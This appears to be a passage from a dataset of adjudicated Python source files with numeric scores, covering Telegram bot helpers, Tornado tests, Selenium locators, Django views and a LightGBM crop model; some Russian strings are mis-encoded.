{}<<NEWL>>    for key, value in parse_qsl(init_data):<<NEWL>>        if (value.startswith('[') and value.endswith(']')) or (value.startswith('{') and value.endswith('}')):<<NEWL>>            value = _loads(value)<<NEWL>>        result[key] = value<<NEWL>>    return result<<NEWL>><<NEWL>><<NEWL>>def safe_parse_webapp_init_data(token: str, init_data: str, _loads: Callable[..., Any]) -> Dict[str, Any]:<<NEWL>>    """"""<<NEWL>>    Validate WebApp init data and return it as dict<<NEWL>><<NEWL>>    :param token:<<NEWL>>    :param init_data:<<NEWL>>    :param _loads:<<NEWL>>    :return:<<NEWL>>    """"""<<NEWL>>    if check_webapp_signature(token, init_data):<<NEWL>>        return parse_init_data(init_data, _loads)<<NEWL>>    raise ValueError(""Invalid init data signature"")"
450	adjudicated	3	"# flake8: noqa<<NEWL>>import subprocess<<NEWL>>import sys<<NEWL>>import unittest<<NEWL>><<NEWL>>_import_everything = b""""""<<NEWL>># The event loop is not fork-safe, and it's easy to initialize an asyncio.Future<<NEWL>># at startup, which in turn creates the default event loop and prevents forking.<<NEWL>># Explicitly disallow the default event loop so that an error will be raised<<NEWL>># if something tries to touch it.<<NEWL>>import asyncio<<NEWL>>asyncio.set_event_loop(None)<<NEWL>><<NEWL>>import tornado.auth<<NEWL>>import tornado.autoreload<<NEWL>>import tornado.concurrent<<NEWL>>import tornado.escape<<NEWL>>import tornado.gen<<NEWL>>import tornado.http1connection<<NEWL>>import tornado.httpclient<<NEWL>>import tornado.httpserver<<NEWL>>import tornado.httputil<<NEWL>>import tornado.ioloop<<NEWL>>import tornado.iostream<<NEWL>>import tornado.locale<<NEWL>>import tornado.log<<NEWL>>import tornado.netutil<<NEWL>>import tornado.options<<NEWL>>import tornado.process<<NEWL>>import tornado.simple_httpclient<<NEWL>>import tornado.tcpserver<<NEWL>>import tornado.tcpclient<<NEWL>>import tornado.template<<NEWL>>import tornado.testing<<NEWL>>import tornado.util<<NEWL>>import tornado.web<<NEWL>>import tornado.websocket<<NEWL>>import tornado.wsgi<<NEWL>><<NEWL>>try:<<NEWL>>    import pycurl<<NEWL>>except ImportError:<<NEWL>>    pass<<NEWL>>else:<<NEWL>>    import tornado.curl_httpclient<<NEWL>>""""""<<NEWL>><<NEWL>><<NEWL>>class ImportTest(unittest.TestCase):<<NEWL>>    def test_import_everything(self):<<NEWL>>        # Test that all Tornado modules can be imported without side effects,<<NEWL>>        # specifically without initializing the default asyncio event loop.<<NEWL>>        # Since we can't tell which modules may have already beein imported<<NEWL>>        # in our process, do it in a subprocess for a clean slate.<<NEWL>>        proc = subprocess.Popen([sys.executable], stdin=subprocess.PIPE)<<NEWL>>        proc.communicate(_import_everything)<<NEWL>>        self.assertEqual(proc.returncode, 0)<<NEWL>><<NEWL>>    def test_import_aliases(self):<<NEWL>>        # Ensure we don't delete formerly-documented aliases accidentally.<<NEWL>>        import tornado.ioloop<<NEWL>>        import tornado.gen<<NEWL>>        import tornado.util<<NEWL>>        import asyncio<<NEWL>><<NEWL>>        self.assertIs(tornado.ioloop.TimeoutError, tornado.util.TimeoutError)<<NEWL>>        self.assertIs(tornado.gen.TimeoutError, tornado.util.TimeoutError)<<NEWL>>        self.assertIs(tornado.util.TimeoutError, asyncio.TimeoutError)"
510	adjudicated	1	"import argparse<<NEWL>>from typing import Tuple<<NEWL>><<NEWL>><<NEWL>>def get_next_version(release_type) -> Tuple[Tuple[int, int, int], str, str]:<<NEWL>>    current_ver = find_version(""fairseq/version.txt"")<<NEWL>>    version_list = [int(x) for x in current_ver.strip(""'"").split(""."")]<<NEWL>>    major, minor, patch = version_list[0], version_list[1], version_list[2]<<NEWL>>    if release_type == ""patch"":<<NEWL>>        patch += 1<<NEWL>>    elif release_type == ""minor"":<<NEWL>>        minor += 1<<NEWL>>        patch = 0<<NEWL>>    elif release_type == ""major"":<<NEWL>>        major += 1<<NEWL>>        minor = patch = 0<<NEWL>>    else:<<NEWL>>        raise ValueError(<<NEWL>>            ""Incorrect release type specified. Acceptable types are major, minor and patch.""<<NEWL>>        )<<NEWL>><<NEWL>>    new_version_tuple = (major, minor, patch)<<NEWL>>    new_version_str = ""."".join([str(x) for x in new_version_tuple])<<NEWL>>    new_tag_str = ""v"" + new_version_str<<NEWL>>    return new_version_tuple, new_version_str, new_tag_str<<NEWL>><<NEWL>><<NEWL>>def find_version(version_file_path) -> str:<<NEWL>>    with open(version_file_path) as f:<<NEWL>>        version = f.read().strip()<<NEWL>>        return version<<NEWL>><<NEWL>><<NEWL>>def update_version(new_version_str) -> None:<<NEWL>>    """"""<<NEWL>>    given the current version, update the version to the<<NEWL>>    next version depending on the type of release.<<NEWL>>    """"""<<NEWL>><<NEWL>>    with open(""fairseq/version.txt"", ""w"") as writer:<<NEWL>>        writer.write(new_version_str)<<NEWL>><<NEWL>><<NEWL>>def main(args):<<NEWL>>    if args.release_type in [""major"", ""minor"", ""patch""]:<<NEWL>>        new_version_tuple, new_version, new_tag = get_next_version(args.release_type)<<NEWL>>    else:<<NEWL>>        raise ValueError(""Incorrect release type specified"")<<NEWL>><<NEWL>>    if args.update_version:<<NEWL>>        update_version(new_version)<<NEWL>><<NEWL>>    print(new_version, new_tag)<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    parser = argparse.ArgumentParser(description=""Versioning utils"")<<NEWL>>    parser.add_argument(<<NEWL>>        ""--release-type"",<<NEWL>>        type=str,<<NEWL>>        required=True,<<NEWL>>        help=""type of release = major/minor/patch"",<<NEWL>>    )<<NEWL>>    parser.add_argument(<<NEWL>>        ""--update-version"",<<NEWL>>        action=""store_true"",<<NEWL>>        required=False,<<NEWL>>        help=""updates the version in fairseq/version.txt"",<<NEWL>>    )<<NEWL>><<NEWL>>    args = parser.parse_args()<<NEWL>>    main(args)"
470	adjudicated	1	"from selenium.webdriver.common.by import By<<NEWL>><<NEWL>><<NEWL>>class BasePageLocators():<<NEWL>>    LOGIN_LINK = (By.CSS_SELECTOR, ""#login_link"")<<NEWL>>    LOGIN_LINK_INVALID = (By.CSS_SELECTOR, ""#login_link_inc"")  # for checking the correct error message<<NEWL>><<NEWL>><<NEWL>>class MainPageLocators():<<NEWL>>    pass<<NEWL>><<NEWL>><<NEWL>>class LoginPageLocators():<<NEWL>>    LOGIN_EMAIL = (By.CSS_SELECTOR, ""[name='login-username']"")<<NEWL>>    LOGIN_PASSWORD = (By.CSS_SELECTOR, ""[name='login-password']"")<<NEWL>>    FORGOT_PASSWORD_BUTTON = (By.CSS_SELECTOR, 'a[href*=""password-reset""]')<<NEWL>>    LOGIN_BUTTON = (By.CSS_SELECTOR, ""[name='login_submit']"")<<NEWL>>    SIGN_UP_EMAIL = (By.CSS_SELECTOR, ""[name='registration-email']"")<<NEWL>>    SIGN_UP_PASSWORD = (By.CSS_SELECTOR, ""[name='registration-password1']"")<<NEWL>>    SIGN_UP_PASSWORD_REPETITION = (By.CSS_SELECTOR, ""[name='registration-password2']"")<<NEWL>>    SIGN_UP_BUTTON = (By.CSS_SELECTOR, ""[name='registration_submit']"")<<NEWL>><<NEWL>><<NEWL>>class ProductPageLocators():<<NEWL>>    PRODUCT_NAME = (By.CSS_SELECTOR, "".product_main > h1"")<<NEWL>>    ADD_TO_BASKET_BUTTON = (By. CSS_SELECTOR, "".btn-add-to-basket"")<<NEWL>>    ADD_TO_WISHLIST_BUTTON = (By.CSS_SELECTOR, "".btn-wishlist"")<<NEWL>>    PRODUCT_GALLERY = (By.CSS_SELECTOR, ""#product_gallery"")<<NEWL>>    PRODUCT_DESCRIPTION = (By.CSS_SELECTOR, ""#product_description"")<<NEWL>>    PRICE = (By.CSS_SELECTOR, "".product_main > .price_color"")<<NEWL>>    AVAILABILITY = (By.CSS_SELECTOR, "".product_main > .availability"")<<NEWL>>    WRITE_REVIEW = (By.CSS_SELECTOR, ""#write_review"")<<NEWL>>    PRODUCT_INFO_TABLE = (By.CSS_SELECTOR, "".table-striped"")<<NEWL>>    SUCCESS_MESSAGE = (By.CSS_SELECTOR, ""#messages > .alert-success:nth-child(1)"")<<NEWL>>    NAME_OF_ADDED_PRODUCT = (By.CSS_SELECTOR, ""div.alert:nth-child(1) strong"")<<NEWL>>    TOTAL_PRICE = (By.CSS_SELECTOR, "".alertinner p strong"")<<NEWL>><<NEWL>><<NEWL>>class BasketPageLocators():<<NEWL>>    VIEW_BASKET = (By.CSS_SELECTOR, "".btn-group > a[href*='basket']"")<<NEWL>>    VIEW_BASKET_INVALID = (By.CSS_SELECTOR, "".btn-group > a[href*='basket']"")  # for checking the correct error message<<NEWL>>    EMPTY_BASKET_MESSAGE = (By.CSS_SELECTOR, ""#content_inner > p"")<<NEWL>>    FILLED_BASKET = (By.CSS_SELECTOR, "".basket-items"")"
421	adjudicated	0	import asyncio<<NEWL>>import json<<NEWL>><<NEWL>>from openpyxl import load_workbook<<NEWL>>from rest_framework.response import Response<<NEWL>>from rest_framework.views import APIView<<NEWL>><<NEWL>>from wildberries.models import Product<<NEWL>>from wildberries.pydantic import CardPydantic<<NEWL>>from wildberries.utils import make_request<<NEWL>><<NEWL>><<NEWL>>class CardView(APIView):<<NEWL>>    @staticmethod<<NEWL>>    def get_card_info(value):<<NEWL>>        page = asyncio.run(make_request(value))<<NEWL>>        return CardView.get_objects(page, value)<<NEWL>><<NEWL>>    @staticmethod<<NEWL>>    def get_cards_info(file):<<NEWL>>        values = []<<NEWL>>        wb = load_workbook(file)<<NEWL>>        for sheet in wb.sheetnames:<<NEWL>>            for row in wb[sheet].iter_rows(values_only=True):<<NEWL>>                values.append(row[0])<<NEWL>>        cards_info = [CardView.get_card_info(i) for i in values]<<NEWL>>        return cards_info<<NEWL>><<NEWL>>    @staticmethod<<NEWL>>    def get_objects(page, value):<<NEWL>>        card = None<<NEWL>>        try:<<NEWL>>            products = json.dumps(page['data']['products'][0])<<NEWL>>            card = CardPydantic.parse_raw(products)<<NEWL>>            Product.objects.create(**card.dict())<<NEWL>>        except IndexError:<<NEWL>>            print(f'id {value} Ð¾ÑÑÑÑÑÑÐ²ÑÐµÑ Ð½Ð° ÑÐ°Ð¹ÑÐµ wildberries.ru')<<NEWL>>        if card:<<NEWL>>            return card.dict()<<NEWL>>        else:<<NEWL>>            return {'error': f'id {value} Ð¾ÑÑÑÑÑÑÐ²ÑÐµÑ Ð½Ð° ÑÐ°Ð¹ÑÐµ wildberries.ru'}<<NEWL>><<NEWL>>    def post(self, request, *args, **kwargs):<<NEWL>>        data = None<<NEWL>>        if 'file' in request.data and 'value' in request.data:<<NEWL>>            return Response({'error': 'ÐÐ´Ð½Ð¾Ð²ÑÐµÐ¼ÐµÐ½Ð½Ð¾ Ð¾ÑÐ¿ÑÐ°Ð²Ð»ÑÑÑ Ð¿Ð¾Ð»Ñ '<<NEWL>>                                      'file Ð¸ value Ð·Ð°Ð¿ÑÐµÑÐµÐ½Ð¾!'})<<NEWL>>        elif 'file' in request.data:<<NEWL>>            file = request.data['file']<<NEWL>>            data = CardView.get_cards_info(file)<<NEWL>>        elif 'value' in request.data:<<NEWL>>            value = request.data['value']<<NEWL>>            data = CardView.get_card_info(value)<<NEWL>>        return Response(data)
483	adjudicated	4	"from . import base<<NEWL>>from . import fields<<NEWL>>from . import mixins<<NEWL>>from .mask_position import MaskPosition<<NEWL>>from .photo_size import PhotoSize<<NEWL>>from .file import File<<NEWL>><<NEWL>><<NEWL>>class Sticker(base.TelegramObject, mixins.Downloadable):<<NEWL>>    """"""<<NEWL>>    This object represents a sticker.<<NEWL>><<NEWL>>    https://core.telegram.org/bots/api#sticker<<NEWL>>    """"""<<NEWL>>    file_id: base.String = fields.Field()<<NEWL>>    file_unique_id: base.String = fields.Field()<<NEWL>>    type: base.String = fields.Field()<<NEWL>>    width: base.Integer = fields.Field()<<NEWL>>    height: base.Integer = fields.Field()<<NEWL>>    is_animated: base.Boolean = fields.Field()<<NEWL>>    is_video: base.Boolean = fields.Field()<<NEWL>>    thumb: PhotoSize = fields.Field(base=PhotoSize)<<NEWL>>    emoji: base.String = fields.Field()<<NEWL>>    set_name: base.String = fields.Field()<<NEWL>>    premium_animation: File = fields.Field(base=File)<<NEWL>>    mask_position: MaskPosition = fields.Field(base=MaskPosition)<<NEWL>>    custom_emoji_id: base.String = fields.Field()<<NEWL>>    file_size: base.Integer = fields.Field()<<NEWL>><<NEWL>>    async def set_position_in_set(self, position: base.Integer) -> base.Boolean:<<NEWL>>        """"""<<NEWL>>        Use this method to move a sticker in a set created by the bot to a specific position.<<NEWL>><<NEWL>>        Source: https://core.telegram.org/bots/api#setstickerpositioninset<<NEWL>><<NEWL>>        :param position: New sticker position in the set, zero-based<<NEWL>>        :type position: :obj:`base.Integer`<<NEWL>>        :return: Returns True on success<<NEWL>>        :rtype: :obj:`base.Boolean`<<NEWL>>        """"""<<NEWL>>        return await self.bot.set_sticker_position_in_set(self.file_id, position=position)<<NEWL>><<NEWL>>    async def delete_from_set(self) -> base.Boolean:<<NEWL>>        """"""<<NEWL>>        Use this method to delete a sticker from a set created by the bot.<<NEWL>><<NEWL>>        Source: https://core.telegram.org/bots/api#deletestickerfromset<<NEWL>><<NEWL>>        :return: Returns True on success<<NEWL>>        :rtype: :obj:`base.Boolean`<<NEWL>>        """"""<<NEWL>>        return await self.bot.delete_sticker_from_set(self.file_id)"
415	adjudicated	0	"import pandas as pd<<NEWL>>import numpy as np<<NEWL>>import random<<NEWL>><<NEWL>>import matplotlib.pyplot as plt<<NEWL>>import seaborn as sns<<NEWL>><<NEWL>>from plotly import graph_objs as go<<NEWL>>from plotly import express as px<<NEWL>>from plotly.subplots import make_subplots<<NEWL>><<NEWL>>import pickle<<NEWL>>import lightgbm as lgb<<NEWL>><<NEWL>><<NEWL>><<NEWL>>colorarr = ['#0592D0','#Cd7f32', '#E97451', '#Bdb76b', '#954535', '#C2b280', '#808000','#C2b280', '#E4d008', '#9acd32', '#Eedc82', '#E4d96f',<<NEWL>>           '#32cd32','#39ff14','#00ff7f', '#008080', '#36454f', '#F88379', '#Ff4500', '#Ffb347', '#A94064', '#E75480', '#Ffb6c1', '#E5e4e2',<<NEWL>>           '#Faf0e6', '#8c92ac', '#Dbd7d2','#A7a6ba', '#B38b6d']<<NEWL>><<NEWL>><<NEWL>>cropdf = pd.read_csv(""D:/Suyash College Files/Semester 6/22060 - Capstone Project Execution and Report Writing/Datasets/Crop_recommendation.csv"")<<NEWL>><<NEWL>>X = cropdf.drop('label', axis=1)<<NEWL>>y = cropdf['label']<<NEWL>><<NEWL>>from sklearn.model_selection import train_test_split<<NEWL>>X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = 0.3,<<NEWL>>                                                    shuffle = True, random_state = 0)<<NEWL>><<NEWL>>model = lgb.LGBMClassifier()<<NEWL>>model.fit(X_train, y_train)<<NEWL>><<NEWL>>y_pred=model.predict(X_test)<<NEWL>><<NEWL>><<NEWL>>from sklearn.metrics import accuracy_score<<NEWL>><<NEWL>>accuracy=accuracy_score(y_pred, y_test)<<NEWL>>print('LightGBM Model accuracy score: {0:0.4f}'.format(accuracy_score(y_test, y_pred)))<<NEWL>><<NEWL>><<NEWL>>y_pred_train = model.predict(X_train)<<NEWL>>print('Training-set accuracy score: {0:0.4f}'. format(accuracy_score(y_train, y_pred_train)))<<NEWL>><<NEWL>>print('Training set score: {:.4f}'.format(model.score(X_train, y_train)))<<NEWL>>print('Test set score: {:.4f}'.format(model.score(X_test, y_test)))<<NEWL>><<NEWL>><<NEWL>>model.booster_.save_model('crop_predict1.h5')<<NEWL>><<NEWL>>        #        my_model.booster_.save_model('mode.txt')<<NEWL>>        #        #load from model:<<NEWL>>        #        #bst = lgb.Booster(model_file='mode.txt')<<NEWL>><<NEWL>><<NEWL>><<NEWL>>filename = ""trained_model.pkl""<<NEWL>>pickle.dump(model,open(filename,'wb'))<<NEWL>><<NEWL>>print(""done with all"")<<NEWL>><<NEWL>>"
504	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""choropleth"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
444	adjudicated	0	"# Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>><<NEWL>>from __future__ import absolute_import<<NEWL>><<NEWL>>import cffi<<NEWL>><<NEWL>>c_source = """"""<<NEWL>>    struct ArrowSchema {<<NEWL>>      // Array type description<<NEWL>>      const char* format;<<NEWL>>      const char* name;<<NEWL>>      const char* metadata;<<NEWL>>      int64_t flags;<<NEWL>>      int64_t n_children;<<NEWL>>      struct ArrowSchema** children;<<NEWL>>      struct ArrowSchema* dictionary;<<NEWL>><<NEWL>>      // Release callback<<NEWL>>      void (*release)(struct ArrowSchema*);<<NEWL>>      // Opaque producer-specific data<<NEWL>>      void* private_data;<<NEWL>>    };<<NEWL>><<NEWL>>    struct ArrowArray {<<NEWL>>      // Array data description<<NEWL>>      int64_t length;<<NEWL>>      int64_t null_count;<<NEWL>>      int64_t offset;<<NEWL>>      int64_t n_buffers;<<NEWL>>      int64_t n_children;<<NEWL>>      const void** buffers;<<NEWL>>      struct ArrowArray** children;<<NEWL>>      struct ArrowArray* dictionary;<<NEWL>><<NEWL>>      // Release callback<<NEWL>>      void (*release)(struct ArrowArray*);<<NEWL>>      // Opaque producer-specific data<<NEWL>>      void* private_data;<<NEWL>>    };<<NEWL>><<NEWL>>    struct ArrowArrayStream {<<NEWL>>      int (*get_schema)(struct ArrowArrayStream*, struct ArrowSchema* out);<<NEWL>>      int (*get_next)(struct ArrowArrayStream*, struct ArrowArray* out);<<NEWL>><<NEWL>>      const char* (*get_last_error)(struct ArrowArrayStream*);<<NEWL>><<NEWL>>      // Release callback<<NEWL>>      void (*release)(struct ArrowArrayStream*);<<NEWL>>      // Opaque producer-specific data<<NEWL>>      void* private_data;<<NEWL>>    };<<NEWL>>    """"""<<NEWL>><<NEWL>># TODO use out-of-line mode for faster import and avoid C parsing<<NEWL>>ffi = cffi.FFI()<<NEWL>>ffi.cdef(c_source)"
179	adjudicated	4	"""""""core URL Configuration<<NEWL>><<NEWL>>The `urlpatterns` list routes URLs to views. For more information please see:<<NEWL>>    https://docs.djangoproject.com/en/3.2/topics/http/urls/<<NEWL>>Examples:<<NEWL>>Function views<<NEWL>>    1. Add an import:  from my_app import views<<NEWL>>    2. Add a URL to urlpatterns:  path('', views.home, name='home')<<NEWL>>Class-based views<<NEWL>>    1. Add an import:  from other_app.views import Home<<NEWL>>    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')<<NEWL>>Including another URLconf<<NEWL>>    1. Import the include() function: from django.urls import include, path<<NEWL>>    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))<<NEWL>>""""""<<NEWL>>from django.conf import settings<<NEWL>>from django.contrib import admin<<NEWL>>from django.urls import include, path<<NEWL>><<NEWL>>from . import views<<NEWL>><<NEWL>># from django.views import debug<<NEWL>><<NEWL>><<NEWL>># Admin site Branding<<NEWL>>admin.site.site_header = ""CoreProject administration""<<NEWL>>admin.site.site_title = ""CoreProject site admin""<<NEWL>><<NEWL>># Error handlers<<NEWL>>handler400 = views.four_zero_zero_view<<NEWL>>handler403 = views.four_zero_three_view<<NEWL>>handler404 = views.four_zero_four_view<<NEWL>>handler500 = views.five_zero_zero_view<<NEWL>><<NEWL>># Write your urls here<<NEWL>><<NEWL>>urlpatterns = [<<NEWL>>    # Default django welcome page<<NEWL>>    # path("""", debug.default_urlconf),<<NEWL>>    path("""", views.home_view, name=""home_view""),<<NEWL>>    #   Admin Site<<NEWL>>    # ================<<NEWL>>    path(""admin/"", admin.site.urls),<<NEWL>>    #   HTTP<<NEWL>>    # =========<<NEWL>>    path(""user/"", include(""apps.user.urls"")),<<NEWL>>    #   OpenGraph<<NEWL>>    # =============<<NEWL>>    path(""opengraph/"", include(""apps.opengraph.urls"")),<<NEWL>>    #   Api<<NEWL>>    # ========<<NEWL>>    path(""api/"", include(""apps.api.urls"")),<<NEWL>>]<<NEWL>><<NEWL>>if settings.DEBUG:<<NEWL>>    urlpatterns += [<<NEWL>>        path(""__debug__/"", include(""debug_toolbar.urls"")),<<NEWL>>        path(""__reload__/"", include(""django_browser_reload.urls"")),<<NEWL>>        #   Errors<<NEWL>>        # ===========<<NEWL>>        path(""400/"", handler400),<<NEWL>>        path(""403/"", handler403),<<NEWL>>        path(""404/"", handler404),<<NEWL>>        path(""500/"", handler500),<<NEWL>>    ]"
39	adjudicated	3	"# Licensed to the Software Freedom Conservancy (SFC) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The SFC licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>><<NEWL>>from selenium.webdriver.common import service<<NEWL>><<NEWL>><<NEWL>>class Service(service.Service):<<NEWL>><<NEWL>>    def __init__(self, executable_path, port=0, verbose=False, log_path=None):<<NEWL>>        """"""<<NEWL>>        Creates a new instance of the EdgeDriver service.<<NEWL>><<NEWL>>        EdgeDriver provides an interface for Microsoft WebDriver to use<<NEWL>>        with Microsoft Edge.<<NEWL>><<NEWL>>        :param executable_path: Path to the Microsoft WebDriver binary.<<NEWL>>        :param port: Run the remote service on a specified port.<<NEWL>>            Defaults to 0, which binds to a random open port of the<<NEWL>>            system's choosing.<<NEWL>>        :verbose: Whether to make the webdriver more verbose (passes the<<NEWL>>            --verbose option to the binary). Defaults to False.<<NEWL>>        :param log_path: Optional path for the webdriver binary to log to.<<NEWL>>            Defaults to None which disables logging.<<NEWL>><<NEWL>>        """"""<<NEWL>><<NEWL>>        self.service_args = []<<NEWL>>        if verbose:<<NEWL>>            self.service_args.append(""--verbose"")<<NEWL>><<NEWL>>        params = {<<NEWL>>            ""executable"": executable_path,<<NEWL>>            ""port"": port,<<NEWL>>            ""start_error_message"": ""Please download from http://go.microsoft.com/fwlink/?LinkId=619687""<<NEWL>>        }<<NEWL>><<NEWL>>        if log_path:<<NEWL>>            params[""log_file""] = open(log_path, ""a+"")<<NEWL>><<NEWL>>        service.Service.__init__(self, **params)<<NEWL>><<NEWL>>    def command_line_args(self):<<NEWL>>        return [""--port=%d"" % self.port] + self.service_args"
128	adjudicated	4	"#!/usr/bin/env python<<NEWL>><<NEWL>># Copyright 2019 Google LLC<<NEWL>>#<<NEWL>># Licensed under the Apache License, Version 2.0 (the ""License"");<<NEWL>># you may not use this file except in compliance with the License.<<NEWL>># You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#    http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing, software<<NEWL>># distributed under the License is distributed on an ""AS IS"" BASIS,<<NEWL>># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.<<NEWL>># See the License for the specific language governing permissions and<<NEWL>># limitations under the License.<<NEWL>><<NEWL>>"""""" Sample command-line program to list Cloud Dataproc clusters in a region.<<NEWL>><<NEWL>>Example usage:<<NEWL>>python list_clusters.py --project_id=my-project-id --region=global<<NEWL>><<NEWL>>""""""<<NEWL>>import argparse<<NEWL>><<NEWL>>from google.cloud import dataproc_v1<<NEWL>><<NEWL>><<NEWL>># [START dataproc_list_clusters]<<NEWL>>def list_clusters(dataproc, project, region):<<NEWL>>    """"""List the details of clusters in the region.""""""<<NEWL>>    for cluster in dataproc.list_clusters(<<NEWL>>        request={""project_id"": project, ""region"": region}<<NEWL>>    ):<<NEWL>>        print((""{} - {}"".format(cluster.cluster_name, cluster.status.state.name)))<<NEWL>><<NEWL>><<NEWL>># [END dataproc_list_clusters]<<NEWL>><<NEWL>><<NEWL>>def main(project_id, region):<<NEWL>><<NEWL>>    if region == ""global"":<<NEWL>>        # Use the default gRPC global endpoints.<<NEWL>>        dataproc_cluster_client = dataproc_v1.ClusterControllerClient()<<NEWL>>    else:<<NEWL>>        # Use a regional gRPC endpoint. See:<<NEWL>>        # https://cloud.google.com/dataproc/docs/concepts/regional-endpoints<<NEWL>>        dataproc_cluster_client = dataproc_v1.ClusterControllerClient(<<NEWL>>            client_options={""api_endpoint"": f""{region}-dataproc.googleapis.com:443""}<<NEWL>>        )<<NEWL>><<NEWL>>    list_clusters(dataproc_cluster_client, project_id, region)<<NEWL>><<NEWL>><<NEWL>>if __name__ == ""__main__"":<<NEWL>>    parser = argparse.ArgumentParser(<<NEWL>>        description=__doc__, formatter_class=(argparse.RawDescriptionHelpFormatter)<<NEWL>>    )<<NEWL>>    parser.add_argument(""--project_id"", help=""Project ID to access."", required=True)<<NEWL>>    parser.add_argument(""--region"", help=""Region of clusters to list."", required=True)<<NEWL>><<NEWL>>    args = parser.parse_args()<<NEWL>>    main(args.project_id, args.region)"
68	adjudicated	2	"from distutils.util import convert_path<<NEWL>>from distutils import log<<NEWL>>from distutils.errors import DistutilsOptionError<<NEWL>>import os<<NEWL>>import shutil<<NEWL>><<NEWL>>from setuptools import Command<<NEWL>><<NEWL>><<NEWL>>class rotate(Command):<<NEWL>>    """"""Delete older distributions""""""<<NEWL>><<NEWL>>    description = ""delete older distributions, keeping N newest files""<<NEWL>>    user_options = [<<NEWL>>        (""match="", ""m"", ""patterns to match (required)""),<<NEWL>>        (""dist-dir="", ""d"", ""directory where the distributions are""),<<NEWL>>        (""keep="", ""k"", ""number of matching distributions to keep""),<<NEWL>>    ]<<NEWL>><<NEWL>>    boolean_options = []<<NEWL>><<NEWL>>    def initialize_options(self):<<NEWL>>        self.match = None<<NEWL>>        self.dist_dir = None<<NEWL>>        self.keep = None<<NEWL>><<NEWL>>    def finalize_options(self):<<NEWL>>        if self.match is None:<<NEWL>>            raise DistutilsOptionError(<<NEWL>>                ""Must specify one or more (comma-separated) match patterns ""<<NEWL>>                ""(e.g. '.zip' or '.egg')""<<NEWL>>            )<<NEWL>>        if self.keep is None:<<NEWL>>            raise DistutilsOptionError(""Must specify number of files to keep"")<<NEWL>>        try:<<NEWL>>            self.keep = int(self.keep)<<NEWL>>        except ValueError as e:<<NEWL>>            raise DistutilsOptionError(""--keep must be an integer"") from e<<NEWL>>        if isinstance(self.match, str):<<NEWL>>            self.match = [convert_path(p.strip()) for p in self.match.split("","")]<<NEWL>>        self.set_undefined_options(""bdist"", (""dist_dir"", ""dist_dir""))<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        self.run_command(""egg_info"")<<NEWL>>        from glob import glob<<NEWL>><<NEWL>>        for pattern in self.match:<<NEWL>>            pattern = self.distribution.get_name() + ""*"" + pattern<<NEWL>>            files = glob(os.path.join(self.dist_dir, pattern))<<NEWL>>            files = [(os.path.getmtime(f), f) for f in files]<<NEWL>>            files.sort()<<NEWL>>            files.reverse()<<NEWL>><<NEWL>>            log.info(""%d file(s) matching %s"", len(files), pattern)<<NEWL>>            files = files[self.keep :]<<NEWL>>            for t, f in 